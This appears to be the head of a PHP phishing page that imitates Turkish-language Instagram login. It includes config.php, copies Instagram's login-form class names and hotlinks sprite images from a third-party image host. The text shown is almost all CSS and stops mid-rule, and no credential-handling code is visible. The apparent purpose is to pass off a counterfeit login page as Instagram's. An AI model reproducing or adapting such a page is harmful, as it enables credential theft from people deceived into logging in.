<?php include("config.php");?>
 <html lang="tr" class="js not-logged-in wf-proximanova-n3-active wf-proximanova-n4-active wf-proximanova-n6-active wf-proximanova-n7-active wf-active">
<!--<![endif]-->
<head>
<title>İnstagram Giriş Yap</title>
<meta name="description" content="instagram giriş instagram giriş yap instagram login">
<meta name="keywords" content="instagram giriş,instagram giris,instagram giriş yap,instagram login">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</script>
<meta name="robots" content="noimageindex">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
<meta name="theme-color" content="#125688">
<style type="text/css" data-isostyle-id="is18d5666d">
        .-cx-PRIVATE-LoginForm__field {
            margin-bottom: 10px
        }

        .-cx-PRIVATE-LoginForm__field:last-child {
            margin-bottom: 0
        }

        .-cx-PRIVATE-LoginForm__forgotLink,
        .-cx-PRIVATE-LoginForm__forgotLink:visited {
            color: #5a89ac;
            float: right;
            font-size: 15px;
            font-weight: 600;
            margin-right: 10px
        }

        .-cx-PRIVATE-LoginForm__inputField {
            background-color: #fdfdfd;
            border: solid 1px #edeeee;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 14px;
            padding: 9px 8px 7px;
            width: 100%;
            -webkit-appearance: none
        }

        .-cx-PRIVATE-LoginForm__inputLabel {
            color: #4a5158;
            display: block;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 5px;
            margin-left: 10px
        }

        .-cx-PRIVATE-LoginForm__loginButton {
            background: #66bd2b;
            border: none;
            border-radius: 3px;
            color: #fff;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            line-height: 15px;
            padding: 10px;
            width: 100%;
            -webkit-appearance: none
        }
        </style>
<style type="text/css" data-isostyle-id="is-2c78b408">
        .coreSpriteEllipsis {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -258px -268px;
            height: 44px;
            width: 44px;
        }

        .coreSpriteHeartFull {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -314px -92px;
            height: 44px;
            width: 44px;
        }

        .coreSpriteHeartOpen {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -360px -92px;
            height: 44px;
            width: 44px;
        }

        .coreSpriteHeartSmall {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -186px -139px;
            height: 19px;
            width: 19px;
        }

        .coreSpriteInstallBannerLogo {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -374px -164px;
            height: 51px;
            width: 51px;
        }

        .coreSpriteLeftPaginationArrow {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -392px -268px;
            height: 40px;
            width: 40px;
        }

        .coreSpriteLikeAnimationHeart {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: 0px -268px;
            height: 81px;
            width: 92px;
        }

        .coreSpriteLoginWithFacebook {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -406px -92px;
            height: 22px;
            width: 21px;
        }

        .coreSpriteNavigationBrand {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -186px -92px;
            height: 45px;
            width: 126px;
        }

        .coreSpriteRightPaginationArrow {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -86px -351px;
            height: 40px;
            width: 40px;
        }

        .coreSpriteSpeechBubbleSmall {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -406px -116px;
            height: 19px;
            width: 19px;
        }

        .coreSpriteUserTagIndicator {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -348px -268px;
            height: 41px;
            width: 42px;
        }

        .coreSpriteVerifiedBadge {
            background-image: url(//i.hizliresim.com/0Dd08D.png);
                background-repeat: no-repeat;
            background-position: -207px -139px;
            height: 18px;
            width: 18px;
        }

    @media (min-device-pixel-ratio: 1.5),
        (-webkit-min-device-pixel-ratio: 1.5),
        (min-resolution: 144dpi) {
        .coreSpriteEllipsis {
                background-size: 219px 216px;
                background-position: -52px -82px;
            }

        .coreSpriteHeartFull {
                background-size: 219px 216px;
                background-position: -97px -82px;
            }

        .coreSpriteHeartOpen {
                background-size: 219px 216px;
                background-position: -142px -82px;
            }

        .coreSpriteHeartSmall {
                background-size: 219px 216px;
                background-position: -84px -175px;
            }

        .coreSpriteInstallBannerLogo {
                background-size: 219px 216px;
                background-position: 0px -82px;
            }

        .coreSpriteLeftPaginationArrow {
                background-size: 219px 216px;
                background-position: -88px -134px;
            }

        .coreSpriteLikeAnimationHeart {
                background-size: 219px 216px;
                background-position: 0px 0px;
            }

        .coreSpriteLoginWithFacebook {
                background-size: 219px 216px;
                background-position: -152px -134px;
            }

        .coreSpriteNavigationBrand {
                background-size: 219px 216px;
                background-position: -93px 0px;
            }

        .coreSpriteRightPaginationArrow {
                background-size: 219px 216px;
                background-position: -47px -134px;
            }

        .coreSpriteSpeechBubbleSmall {
                background-size: 219px 216px;
                background-position: -64px -175px;
            }

        .coreSpriteUserTagIndicator {
                background-size: 219px 216px;
                background-position: 0px -175px;
            }

        .coreSpriteVerifiedBadge {
                background-size: 219px 216px;
                background-position: -104px -175px;
            }
        }
        </style>
<style type="text/css" data-isostyle-id="is-22e29400">
        .-cx-PRIVATE-LoginFormFacebookOption__blueButton {
            background: #3b5998;
            border: none;
            box-shadow: none;
            padding: 5px;
            text-align: center
        }

        .-cx-PRIVATE-LoginFormFacebookOption__blueButton:hover {
            background: #3b5998
        }

        .-cx-PRIVATE-LoginFormFacebookOption__facebookLoginIcon {
            display: inline-block;
            height: 22px;
            margin-right: 8px;
            vertical-align: middle;
            width: 21px
        }

        .-cx-PRIVATE-LoginFormFacebookOption__loginLabel {
            color: #fff;
            font-size: 15px;
            font-weight: 600
        }

        .-cx-PRIVATE-LoginFormFacebookOption__orLabel {
            color: #4b4f54;
            font-size: 15px;
            margin: 10px 0;
            text-align: center;
            text-transform: uppercase
        }
        </style>
<style type="text/css" data-isostyle-id="is-98e9aeb">
        .spiSpinner {
            left: 50%;
            position: absolute;
            top: 50%;
            background-size: 100%
        }

@-webkit-keyframes 'spin8' {
            0%, 12.499% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            12.5%,
            24.999% {
            -webkit-transform: rotate(225deg);
            -moz-transform: rotate(225deg);
            -o-transform: rotate(225deg);
            transform: rotate(225deg)
        }
            25%,
            37.499% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            37.5%,
            49.999% {
            -webkit-transform: rotate(315deg);
            -moz-transform: rotate(315deg);
            -o-transform: rotate(315deg);
            transform: rotate(315deg)
        }
            50%,
            62.499% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
            62.5%,
            74.999% {
            -webkit-transform: rotate(405deg);
            -moz-transform: rotate(405deg);
            -o-transform: rotate(405deg);
            transform: rotate(405deg)
        }
            75%,
            87.499% {
            -webkit-transform: rotate(450deg);
            -moz-transform: rotate(450deg);
            -o-transform: rotate(450deg);
            transform: rotate(450deg)
        }
            87.5%,
            99.999% {
            -webkit-transform: rotate(495deg);
            -moz-transform: rotate(495deg);
            -o-transform: rotate(495deg);
            transform: rotate(495deg)
        }
            100% {
            -webkit-transform: rotate(100deg);
            -moz-transform: rotate(100deg);
            -o-transform: rotate(100deg);
            transform: rotate(100deg)
        }
        }

@-moz-keyframes spin8 {
            0%, 12.499% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            12.5%,
            24.999% {
            -webkit-transform: rotate(225deg);
            -moz-transform: rotate(225deg);
            -o-transform: rotate(225deg);
            transform: rotate(225deg)
        }
            25%,
            37.499% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            37.5%,
            49.999% {
            -webkit-transform: rotate(315deg);
            -moz-transform: rotate(315deg);
            -o-transform: rotate(315deg);
            transform: rotate(315deg)
        }
            50%,
            62.499% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
            62.5%,
            74.999% {
            -webkit-transform: rotate(405deg);
            -moz-transform: rotate(405deg);
            -o-transform: rotate(405deg);
            transform: rotate(405deg)
        }
            75%,
            87.499% {
            -webkit-transform: rotate(450deg);
            -moz-transform: rotate(450deg);
            -o-transform: rotate(450deg);
            transform: rotate(450deg)
        }
            87.5%,
            99.999% {
            -webkit-transform: rotate(495deg);
            -moz-transform: rotate(495deg);
            -o-transform: rotate(495deg);
            transform: rotate(495deg)
        }
            100% {
            -webkit-transform: rotate(100deg);
            -moz-transform: rotate(100deg);
            -o-transform: rotate(100deg);
            transform: rotate(100deg)
        }
        }

@-ms-keyframes spin8 {
            0%, 12.499% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            12.5%,
            24.999% {
            -webkit-transform: rotate(225deg);
            -moz-transform: rotate(225deg);
            -o-transform: rotate(225deg);
            transform: rotate(225deg)
        }
            25%,
            37.499% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            37.5%,
            49.999% {
            -webkit-transform: rotate(315deg);
            -moz-transform: rotate(315deg);
            -o-transform: rotate(315deg);
            transform: rotate(315deg)
        }
            50%,
            62.499% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
            62.5%,
            74.999% {
            -webkit-transform: rotate(405deg);
            -moz-transform: rotate(405deg);
            -o-transform: rotate(405deg);
            transform: rotate(405deg)
        }
            75%,
            87.499% {
            -webkit-transform: rotate(450deg);
            -moz-transform: rotate(450deg);
            -o-transform: rotate(450deg);
            transform: rotate(450deg)
        }
            87.5%,
            99.999% {
            -webkit-transform: rotate(495deg);
            -moz-transform: rotate(495deg);
            -o-transform: rotate(495deg);
            transform: rotate(495deg)
        }
            100% {
            -webkit-transform: rotate(100deg);
            -moz-transform: rotate(100deg);
            -o-transform: rotate(100deg);
            transform: rotate(100deg)
        }
        }

@-o-keyframes spin8 {
            0%, 12.499% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            12.5%,
            24.999% {
            -webkit-transform: rotate(225deg);
            -moz-transform: rotate(225deg);
            -o-transform: rotate(225deg);
            transform: rotate(225deg)
        }
            25%,
            37.499% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            37.5%,
            49.999% {
            -webkit-transform: rotate(315deg);
            -moz-transform: rotate(315deg);
            -o-transform: rotate(315deg);
            transform: rotate(315deg)
        }
            50%,
            62.499% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
            62.5%,
            74.999% {
            -webkit-transform: rotate(405deg);
            -moz-transform: rotate(405deg);
            -o-transform: rotate(405deg);
            transform: rotate(405deg)
        }
            75%,
            87.499% {
            -webkit-transform: rotate(450deg);
            -moz-transform: rotate(450deg);
            -o-transform: rotate(450deg);
            transform: rotate(450deg)
        }
            87.5%,
            99.999% {
            -webkit-transform: rotate(495deg);
            -moz-transform: rotate(495deg);
            -o-transform: rotate(495deg);
            transform: rotate(495deg)
        }
            100% {
            -webkit-transform: rotate(100deg);
            -moz-transform: rotate(100deg);
            -o-transform: rotate(100deg);
            transform: rotate(100deg)
        }
        }

@keyframes 'spin8' {
            0%, 12.499% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            12.5%,
            24.999% {
            -webkit-transform: rotate(225deg);
            -moz-transform: rotate(225deg);
            -o-transform: rotate(225deg);
            transform: rotate(225deg)
        }
            25%,
            37.499% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            37.5%,
            49.999% {
            -webkit-transform: rotate(315deg);
            -moz-transform: rotate(315deg);
            -o-transform: rotate(315deg);
            transform: rotate(315deg)
        }
            50%,
            62.499% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
            62.5%,
            74.999% {
            -webkit-transform: rotate(405deg);
            -moz-transform: rotate(405deg);
            -o-transform: rotate(405deg);
            transform: rotate(405deg)
        }
            75%,
            87.499% {
            -webkit-transform: rotate(450deg);
            -moz-transform: rotate(450deg);
            -o-transform: rotate(450deg);
            transform: rotate(450deg)
        }
            87.5%,
            99.999% {
            -webkit-transform: rotate(495deg);
            -moz-transform: rotate(495deg);
            -o-transform: rotate(495deg);
            transform: rotate(495deg)
        }
            100% {
            -webkit-transform: rotate(100deg);
            -moz-transform: rotate(100deg);
            -o-transform: rotate(100deg);
            transform: rotate(100deg)
        }
        }

        .spiSmall {
            height: 18px;
            margin-left: -9px;
            margin-top: -9px;
            width: 18px;
            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2hpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoyRTNGMkVENTlEMjE2ODExODIyQUNEMjMwNzUzNTEzMyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDowMzIxMkU3QTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowMzIxMkU3OTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6ODJGQzEwNTI1MDIyNjgxMTgyMkFDRDIzMDc1MzUxMzMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkUzRjJFRDU5RDIxNjgxMTgyMkFDRDIzMDc1MzUxMzMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6COBsvAAACo0lEQVR42uyZu08UURjFZ1Y2GjQ+MIaEmODb1qVGQkMhhZ001rKN8Q+AWFjY2NqwGgsrKwq1oqAxgYagogWNxS6ymvAw+AAW3TCem5xNbibcuzM7995x4nzJL8zOzM6cc1/fd1k/CAIvy1HwMh65gdxAbiDj0WXjoeVyWXmtUqlkpgdGwCdQBTezOISmwEXQLxre1kv8qJlYNywUEX6wH+fLUYfaf7kKnQdPwAswbEDDYXAGnAZFFwYmwAC4DB6BGwnEHwE9FC6MnHRh4Fjo+w86NCHEnwrNjYILA49BM6GJg8SL+OHCwDyYVJgYlc6tSsffIojfAruu8sCswsR9cJaf74INih/nuUMa8TuuS4lZ/n0oPafIVUq0/ksSfp8x8SbyQKsn9vh5BSxq7v8t9VqQVHzbTBwj+/aBC+BtS1A4k0rP8rlkNkNDsKPMbKoa/UKilhgNl+V0STQgOK64LobBU/BOV7/I19gbJ8A5jYY/oAa+J50DdzTiPWbP8Q4ar79NAxZ5j5NirunZicCEgSmu56rY4BCKG1WuSroVq2ZiDnwA9+LuGTSrkFw2fLQ6iQ+YeLp50MsWa0R4pyidf4HtpBsaE8voVXCLz9rikGto3jcEjoJ98B7U0/yvhBA/xhqn1ROilFhW9FgPxbfmX4nH9TQMhMV7bNV1HouibpBC5zi8fvKegpSVE5koGBQvlrzX0oo1yPwhNkDXeW6X5cZ+aLNfkqpY6wYuKcS/EtlYOicnv27p+KvCxDXWVNYNDEcQ3y5UJq64MLCXULzORNOFgRnwmZN1ukPxsokFFmybYMnFKrQGnhmsd9ZIKjuy1MO38Sslk9htKWmJefM8TonwL/TAHEsKIf6NrZd0WTRQJVYjnwNpR/4rZW4gN5Dx+CvAABjBsk/oCqxuAAAAAElFTkSuQmCC);
            -webkit-animation: spin8 .8s linear infinite;
            -moz-animation: spin8 .8s linear infinite;
            -o-animation: spin8 .8s linear infinite;
            animation: spin8 .8s linear infinite
        }

@-webkit-keyframes 'spin12' {
            0%, 8.332% {
            -webkit-transform: rotate(0);
            -moz-transform: rotate(0);
            -o-transform: rotate(0);
            transform: rotate(0)
        }
            8.333%,
            16.665% {
            -webkit-transform: rotate(30deg);
            -moz-transform: rotate(30deg);
            -o-transform: rotate(30deg);
            transform: rotate(30deg)
        }
            16.666%,
            24.999% {
            -webkit-transform: rotate(60deg);
            -moz-transform: rotate(60deg);
            -o-transform: rotate(60deg);
            transform: rotate(60deg)
        }
            25%,
            33.332% {
            -webkit-transform: rotate(90deg);
            -moz-transform: rotate(90deg);
            -o-transform: rotate(90deg);
            transform: rotate(90deg)
        }
            33.333%,
            41.665% {
            -webkit-transform: rotate(120deg);
            -moz-transform: rotate(120deg);
            -o-transform: rotate(120deg);
            transform: rotate(120deg)
        }
            41.666%,
            49.999% {
            -webkit-transform: rotate(150deg);
            -moz-transform: rotate(150deg);
            -o-transform: rotate(150deg);
            transform: rotate(150deg)
        }
            50%,
            58.332% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            58.333%,
            66.665% {
            -webkit-transform: rotate(210deg);
            -moz-transform: rotate(210deg);
            -o-transform: rotate(210deg);
            transform: rotate(210deg)
        }
            66.666%,
            74.999% {
            -webkit-transform: rotate(240deg);
            -moz-transform: rotate(240deg);
            -o-transform: rotate(240deg);
            transform: rotate(240deg)
        }
            75%,
            83.332% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            83.333%,
            91.665% {
            -webkit-transform: rotate(300deg);
            -moz-transform: rotate(300deg);
            -o-transform: rotate(300deg);
            transform: rotate(300deg)
        }
            91.666%,
            99.999% {
            -webkit-transform: rotate(330deg);
            -moz-transform: rotate(330deg);
            -o-transform: rotate(330deg);
            transform: rotate(330deg)
        }
            100% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
        }

@-moz-keyframes spin12 {
            0%, 8.332% {
            -webkit-transform: rotate(0);
            -moz-transform: rotate(0);
            -o-transform: rotate(0);
            transform: rotate(0)
        }
            8.333%,
            16.665% {
            -webkit-transform: rotate(30deg);
            -moz-transform: rotate(30deg);
            -o-transform: rotate(30deg);
            transform: rotate(30deg)
        }
            16.666%,
            24.999% {
            -webkit-transform: rotate(60deg);
            -moz-transform: rotate(60deg);
            -o-transform: rotate(60deg);
            transform: rotate(60deg)
        }
            25%,
            33.332% {
            -webkit-transform: rotate(90deg);
            -moz-transform: rotate(90deg);
            -o-transform: rotate(90deg);
            transform: rotate(90deg)
        }
            33.333%,
            41.665% {
            -webkit-transform: rotate(120deg);
            -moz-transform: rotate(120deg);
            -o-transform: rotate(120deg);
            transform: rotate(120deg)
        }
            41.666%,
            49.999% {
            -webkit-transform: rotate(150deg);
            -moz-transform: rotate(150deg);
            -o-transform: rotate(150deg);
            transform: rotate(150deg)
        }
            50%,
            58.332% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            58.333%,
            66.665% {
            -webkit-transform: rotate(210deg);
            -moz-transform: rotate(210deg);
            -o-transform: rotate(210deg);
            transform: rotate(210deg)
        }
            66.666%,
            74.999% {
            -webkit-transform: rotate(240deg);
            -moz-transform: rotate(240deg);
            -o-transform: rotate(240deg);
            transform: rotate(240deg)
        }
            75%,
            83.332% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            83.333%,
            91.665% {
            -webkit-transform: rotate(300deg);
            -moz-transform: rotate(300deg);
            -o-transform: rotate(300deg);
            transform: rotate(300deg)
        }
            91.666%,
            99.999% {
            -webkit-transform: rotate(330deg);
            -moz-transform: rotate(330deg);
            -o-transform: rotate(330deg);
            transform: rotate(330deg)
        }
            100% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
        }

@-ms-keyframes spin12 {
            0%, 8.332% {
            -webkit-transform: rotate(0);
            -moz-transform: rotate(0);
            -o-transform: rotate(0);
            transform: rotate(0)
        }
            8.333%,
            16.665% {
            -webkit-transform: rotate(30deg);
            -moz-transform: rotate(30deg);
            -o-transform: rotate(30deg);
            transform: rotate(30deg)
        }
            16.666%,
            24.999% {
            -webkit-transform: rotate(60deg);
            -moz-transform: rotate(60deg);
            -o-transform: rotate(60deg);
            transform: rotate(60deg)
        }
            25%,
            33.332% {
            -webkit-transform: rotate(90deg);
            -moz-transform: rotate(90deg);
            -o-transform: rotate(90deg);
            transform: rotate(90deg)
        }
            33.333%,
            41.665% {
            -webkit-transform: rotate(120deg);
            -moz-transform: rotate(120deg);
            -o-transform: rotate(120deg);
            transform: rotate(120deg)
        }
            41.666%,
            49.999% {
            -webkit-transform: rotate(150deg);
            -moz-transform: rotate(150deg);
            -o-transform: rotate(150deg);
            transform: rotate(150deg)
        }
            50%,
            58.332% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            58.333%,
            66.665% {
            -webkit-transform: rotate(210deg);
            -moz-transform: rotate(210deg);
            -o-transform: rotate(210deg);
            transform: rotate(210deg)
        }
            66.666%,
            74.999% {
            -webkit-transform: rotate(240deg);
            -moz-transform: rotate(240deg);
            -o-transform: rotate(240deg);
            transform: rotate(240deg)
        }
            75%,
            83.332% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            83.333%,
            91.665% {
            -webkit-transform: rotate(300deg);
            -moz-transform: rotate(300deg);
            -o-transform: rotate(300deg);
            transform: rotate(300deg)
        }
            91.666%,
            99.999% {
            -webkit-transform: rotate(330deg);
            -moz-transform: rotate(330deg);
            -o-transform: rotate(330deg);
            transform: rotate(330deg)
        }
            100% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
        }

@-o-keyframes spin12 {
            0%, 8.332% {
            -webkit-transform: rotate(0);
            -moz-transform: rotate(0);
            -o-transform: rotate(0);
            transform: rotate(0)
        }
            8.333%,
            16.665% {
            -webkit-transform: rotate(30deg);
            -moz-transform: rotate(30deg);
            -o-transform: rotate(30deg);
            transform: rotate(30deg)
        }
            16.666%,
            24.999% {
            -webkit-transform: rotate(60deg);
            -moz-transform: rotate(60deg);
            -o-transform: rotate(60deg);
            transform: rotate(60deg)
        }
            25%,
            33.332% {
            -webkit-transform: rotate(90deg);
            -moz-transform: rotate(90deg);
            -o-transform: rotate(90deg);
            transform: rotate(90deg)
        }
            33.333%,
            41.665% {
            -webkit-transform: rotate(120deg);
            -moz-transform: rotate(120deg);
            -o-transform: rotate(120deg);
            transform: rotate(120deg)
        }
            41.666%,
            49.999% {
            -webkit-transform: rotate(150deg);
            -moz-transform: rotate(150deg);
            -o-transform: rotate(150deg);
            transform: rotate(150deg)
        }
            50%,
            58.332% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            58.333%,
            66.665% {
            -webkit-transform: rotate(210deg);
            -moz-transform: rotate(210deg);
            -o-transform: rotate(210deg);
            transform: rotate(210deg)
        }
            66.666%,
            74.999% {
            -webkit-transform: rotate(240deg);
            -moz-transform: rotate(240deg);
            -o-transform: rotate(240deg);
            transform: rotate(240deg)
        }
            75%,
            83.332% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            83.333%,
            91.665% {
            -webkit-transform: rotate(300deg);
            -moz-transform: rotate(300deg);
            -o-transform: rotate(300deg);
            transform: rotate(300deg)
        }
            91.666%,
            99.999% {
            -webkit-transform: rotate(330deg);
            -moz-transform: rotate(330deg);
            -o-transform: rotate(330deg);
            transform: rotate(330deg)
        }
            100% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
        }

@keyframes 'spin12' {
            0%, 8.332% {
            -webkit-transform: rotate(0);
            -moz-transform: rotate(0);
            -o-transform: rotate(0);
            transform: rotate(0)
        }
            8.333%,
            16.665% {
            -webkit-transform: rotate(30deg);
            -moz-transform: rotate(30deg);
            -o-transform: rotate(30deg);
            transform: rotate(30deg)
        }
            16.666%,
            24.999% {
            -webkit-transform: rotate(60deg);
            -moz-transform: rotate(60deg);
            -o-transform: rotate(60deg);
            transform: rotate(60deg)
        }
            25%,
            33.332% {
            -webkit-transform: rotate(90deg);
            -moz-transform: rotate(90deg);
            -o-transform: rotate(90deg);
            transform: rotate(90deg)
        }
            33.333%,
            41.665% {
            -webkit-transform: rotate(120deg);
            -moz-transform: rotate(120deg);
            -o-transform: rotate(120deg);
            transform: rotate(120deg)
        }
            41.666%,
            49.999% {
            -webkit-transform: rotate(150deg);
            -moz-transform: rotate(150deg);
            -o-transform: rotate(150deg);
            transform: rotate(150deg)
        }
            50%,
            58.332% {
            -webkit-transform: rotate(180deg);
            -moz-transform: rotate(180deg);
            -o-transform: rotate(180deg);
            transform: rotate(180deg)
        }
            58.333%,
            66.665% {
            -webkit-transform: rotate(210deg);
            -moz-transform: rotate(210deg);
            -o-transform: rotate(210deg);
            transform: rotate(210deg)
        }
            66.666%,
            74.999% {
            -webkit-transform: rotate(240deg);
            -moz-transform: rotate(240deg);
            -o-transform: rotate(240deg);
            transform: rotate(240deg)
        }
            75%,
            83.332% {
            -webkit-transform: rotate(270deg);
            -moz-transform: rotate(270deg);
            -o-transform: rotate(270deg);
            transform: rotate(270deg)
        }
            83.333%,
            91.665% {
            -webkit-transform: rotate(300deg);
            -moz-transform: rotate(300deg);
            -o-transform: rotate(300deg);
            transform: rotate(300deg)
        }
            91.666%,
            99.999% {
            -webkit-transform: rotate(330deg);
            -moz-transform: rotate(330deg);
            -o-transform: rotate(330deg);
            transform: rotate(330deg)
        }
            100% {
            -webkit-transform: rotate(360deg);
            -moz-transform: rotate(360deg);
            -o-transform: rotate(360deg);
            transform: rotate(360deg)
        }
        }

        .spiLarge {
            height: 64px;
            margin-left: -32px;
            margin-top: -32px;
            width: 64px;
